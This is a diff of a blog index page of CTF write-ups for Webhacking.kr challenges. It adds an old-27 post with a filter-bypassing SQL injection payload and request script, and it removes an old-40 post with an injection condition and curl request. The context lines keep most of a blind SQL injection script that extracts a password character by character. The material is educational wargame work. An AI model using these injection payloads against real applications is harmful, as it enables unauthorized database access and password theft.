@@ -232,7 +232,7 @@ p.spoiler {
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">527</span>
+          <span class="site-state-item-count">528</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -243,7 +243,7 @@ p.spoiler {
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">357</span>
+        <span class="site-state-item-count">358</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
@@ -270,6 +270,134 @@ p.spoiler {
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/webhacking/old-27/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="vkkkv">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hello Navi">
+      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Hello Navi">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/wp/webhacking/old-27/" class="post-title-link" itemprop="url">Webhacking.kr old-27</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2026-09-26 12:42:56" itemprop="dateCreated datePublished" datetime="2026-09-26T12:42:56+08:00">2026-09-26</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+        </span>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/wp/webhacking/old-27/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/webhacking/old-27/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="Word count in article">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">Word count in article: </span>
+      <span>239</span>
+    </span>
+    <span class="post-meta-item" title="Reading time">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">Reading time &asymp;</span>
+      <span>1 mins.</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h3 id="challenge">Challenge</h3>
+<blockquote>
+<p>Return the admin row while bypassing the SQL filters.</p>
+<p>绕过 SQL 过滤器并返回 admin 记录。</p>
+</blockquote>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://webhacking.kr/challenge/web-12/</span><br></pre></td></tr></table></figure>
+<h3 id="analysis">Analysis</h3>
+<p>题目的查询形态为：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> id <span class="keyword">FROM</span> chall27 <span class="keyword">WHERE</span> id<span class="operator">=</span><span class="string">&#x27;guest&#x27;</span> <span class="keyword">AND</span> <span class="keyword">no</span><span class="operator">=</span>(INPUT)</span><br></pre></td></tr></table></figure>
+<p>过滤器拒绝
+<code>#</code>、空格、<code>=</code>、<code>select</code>、<code>limit</code>、<code>0x</code>
+和括号中的部分形式。payload 先用 <code>0)</code> 闭合
+<code>no=(INPUT)</code>，再用 URL 编码的 Tab 作为 SQL 空白，用
+<code>LIKE</code> 替代 <code>=</code>，最后用 <code>--</code>
+注释掉服务端拼接的右括号。<code>2</code> 是 admin 行对应的
+<code>no</code> 值，因此条件会返回目标记录。</p>
+<h3 id="solution">Solution</h3>
+<p>完整请求脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">BASE_URL = <span class="string">&quot;https://webhacking.kr/challenge/web-12/&quot;</span></span><br><span class="line">PAYLOAD = <span class="string">&quot;0)%09or%09no%09like%092%09--%09&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>() -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="comment"># 保留 %09；直接拼接可避免 requests 将其变成字面量 %2509。</span></span><br><span class="line">    response = requests.get(</span><br><span class="line">        BASE_URL + <span class="string">&quot;?no=&quot;</span> + PAYLOAD,</span><br><span class="line">        timeout=<span class="number">20</span>,</span><br><span class="line">    )</span><br><span class="line">    response.raise_for_status()</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+<p>服务端收到并解码 Tab 后，拼接结果等价于：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> id <span class="keyword">FROM</span> chall27 <span class="keyword">WHERE</span> id<span class="operator">=</span><span class="string">&#x27;guest&#x27;</span> <span class="keyword">AND</span> <span class="keyword">no</span><span class="operator">=</span>(<span class="number">0</span>) <span class="keyword">OR</span> <span class="keyword">no</span> <span class="keyword">LIKE</span> <span class="number">2</span> <span class="comment">-- )</span></span><br></pre></td></tr></table></figure>
+<p>该 payload 让查询结果命中 <code>no=2</code> 的 admin 记录。</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -1401,136 +1529,6 @@ parameter.</p>
 参数提交结果。运行前把自己的登录 session
 放入环境变量，脚本不会包含任何真实 Cookie：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">BASE_URL = <span class="string">&quot;https://webhacking.kr/challenge/web-09/&quot;</span></span><br><span class="line">SECRET_MARKER = <span class="string">&quot;Secret&quot;</span></span><br><span class="line">PASSWORD_LENGTH = <span class="number">11</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_condition</span>(<span class="params">position, character</span>):</span><br><span class="line">    encoded = <span class="built_in">hex</span>(<span class="built_in">ord</span>(character))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;IF(SUBSTR(id,<span class="subst">&#123;position&#125;</span>,1)LIKE(<span class="subst">&#123;encoded&#125;</span>),3,0)&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">response_is_true</span>(<span class="params">session, payload</span>):</span><br><span class="line">    response = session.get(</span><br><span class="line">        BASE_URL,</span><br><span class="line">        params=&#123;<span class="string">&quot;no&quot;</span>: payload&#125;,</span><br><span class="line">        timeout=<span class="number">20</span>,</span><br><span class="line">    )</span><br><span class="line">    response.raise_for_status()</span><br><span class="line">    <span class="keyword">return</span> SECRET_MARKER <span class="keyword">in</span> response.text</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_password</span>(<span class="params">session</span>):</span><br><span class="line">    password = []</span><br><span class="line">    <span class="keyword">for</span> position <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, PASSWORD_LENGTH + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> character <span class="keyword">in</span> string.printable:</span><br><span class="line">            <span class="keyword">if</span> character <span class="keyword">in</span> <span class="string">&quot;\r\n\t\x0b\x0c&quot;</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            payload = make_condition(position, character)</span><br><span class="line">            <span class="keyword">if</span> response_is_true(session, payload):</span><br><span class="line">                password.append(character)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">f&quot;no character matched at position <span class="subst">&#123;position&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(password)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    session_cookie = os.environ.get(<span class="string">&quot;CHALLENGE_SESSION&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> session_cookie:</span><br><span class="line">        <span class="keyword">raise</span> SystemExit(<span class="string">&quot;set session-cookie to your own challenge session before running&quot;</span>)</span><br><span class="line"></span><br><span class="line">    session = requests.Session()</span><br><span class="line">    session.cookies.<span class="built_in">set</span>(<span class="string">&quot;PHPSESSID&quot;</span>, session_cookie, domain=<span class="string">&quot;webhacking.kr&quot;</span>, path=<span class="string">&quot;/&quot;</span>)</span><br><span class="line"></span><br><span class="line">    password = extract_password(session)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;password=<span class="subst">&#123;password&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    result = session.get(BASE_URL, params=&#123;<span class="string">&quot;pw&quot;</span>: password&#125;, timeout=<span class="number">20</span>)</span><br><span class="line">    result.raise_for_status()</span><br><span class="line">    <span class="built_in">print</span>(result.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/webhacking/old-40/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="vkkkv">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hello Navi">
-      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Hello Navi">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/webhacking/old-40/" class="post-title-link" itemprop="url">Webhacking.kr old-40</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2026-09-26 12:16:04" itemprop="dateCreated datePublished" datetime="2026-09-26T12:16:04+08:00">2026-09-26</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
-        </span>
-    </span>
-
-  
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus: </span>
-    
-    <a title="disqus" href="/wp/webhacking/old-40/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/webhacking/old-40/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-    <span class="post-meta-break"></span>
-    <span class="post-meta-item" title="Word count in article">
-      <span class="post-meta-item-icon">
-        <i class="far fa-file-word"></i>
-      </span>
-      <span class="post-meta-item-text">Word count in article: </span>
-      <span>255</span>
-    </span>
-    <span class="post-meta-item" title="Reading time">
-      <span class="post-meta-item-icon">
-        <i class="far fa-clock"></i>
-      </span>
-      <span class="post-meta-item-text">Reading time &asymp;</span>
-      <span>1 mins.</span>
-    </span>
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h3 id="challenge">Challenge</h3>
-<blockquote>
-<p>Extract the admin password through the login query.</p>
-<p>通过登录查询提取 admin 密码。</p>
-</blockquote>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://webhacking.kr/challenge/web-29/</span><br></pre></td></tr></table></figure>
-<h3 id="analysis">Analysis</h3>
-<p>登录查询同时使用 <code>no</code> 和 <code>id</code>。将
-<code>no</code> 设置为 <code>0||no=2&amp;&amp;id=0x61646d696e</code>
-后，页面进入 <code>no=2</code> 且 <code>id=admin</code> 对应的 admin
-password 分支。<code>0x61646d696e</code> 是 <code>admin</code>
-的十六进制字面量，解析结果为 <code>admin</code>。</p>
-<p>当前分支页面的表单为 GET 请求，字段名是 <code>auth</code>：</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">get</span>&gt;</span></span><br><span class="line">admin password : <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">text</span> <span class="attr">name</span>=<span class="string">auth</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>该页面只提供密码校验入口，响应没有直接泄露 password。已知候选
-<code>auth=213</code> 返回
-<code>Failure</code>，当前没有可确认的密码或固定 flag，因此不添加
-spoiler。</p>
-<h3 id="solution">Solution</h3>
-<p>将 <code>no</code> 构造成一个始终命中 <code>no=2</code> 和
-<code>id=admin</code> 的条件，同时保留其它 GET 参数：</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">no=0||no=2&amp;&amp;id=0x61646d696e</span><br><span class="line">id=guest</span><br><span class="line">pw=guest</span><br></pre></td></tr></table></figure>
-<p>对应请求：</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ curl -sS -b &#x27;PHPSESSID=&lt;mission-cookie&gt;&#x27; \\</span><br><span class="line">  &#x27;https://webhacking.kr/challenge/web-29/?no=0%7C%7Cno%3D2%26%26id%3D0x61646d696e&amp;id=guest&amp;pw=guest&#x27;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;Challenge 40&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form method=get&gt;</span><br><span class="line">admin password : &lt;input type=text name=auth&gt;&lt;input type=submit&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
 
       
     </div>
